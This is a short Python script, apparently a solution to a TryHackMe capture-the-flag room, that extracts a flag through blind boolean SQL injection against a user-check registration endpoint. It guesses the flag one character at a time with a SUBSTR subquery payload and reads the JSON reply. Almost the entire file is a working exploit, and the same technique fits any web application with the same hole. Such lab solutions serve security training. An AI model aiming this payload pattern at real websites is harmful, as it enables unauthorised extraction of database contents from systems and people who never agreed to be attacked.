#!/usr/bin/python3
import string
from sys import argv

import requests


def main():
	try:
		ip = argv[1]
	except :
		print(f"[!] Usage: {argv[0]} <ip>")
		exit(-1)

	url = f"http://{ip}/register/user-check?username="

	flag = "THM{FLAG3:"

	hex_chars = ['A', 'B' 'C', 'D', 'E', 'F']

	char_set = ''.join(hex_chars) + string.digits + ':' + '}' 
	#print(char_set)

	print("[*] Getting the flag...")

	while '}' not in flag: 
		for char in char_set:
			pos = len(flag) + 1
			payload = f"admin' AND (SELECT SUBSTR((SELECT flag from flag),{pos},1)='{char}') -- -"

			#print(url+payload)
			r = requests.get(url + payload)
			#print(char)
			#print(r.text)

			if("{\"available\":false}" in r.text):
				flag += char
				print(f"flag: {flag}")
				break

	print(f"[!] Flag: {flag}")

if __name__ == "__main__":
	main()